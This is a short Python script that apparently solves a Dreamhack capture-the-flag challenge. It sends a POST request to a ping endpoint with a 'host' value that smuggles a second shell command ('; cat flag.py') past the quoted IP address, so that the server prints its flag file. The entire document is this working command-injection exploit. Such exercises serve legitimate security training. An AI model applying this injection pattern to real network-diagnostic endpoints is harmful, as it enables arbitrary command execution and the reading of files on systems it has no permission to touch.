import requests

baseurl = "http://host3.dreamhack.games:24030/ping"

data = {"host":'8.8.8.8" ; cat flag.py; echo "8.8.8.8'}

resp = requests.post(baseurl, data=data)

print(resp.text)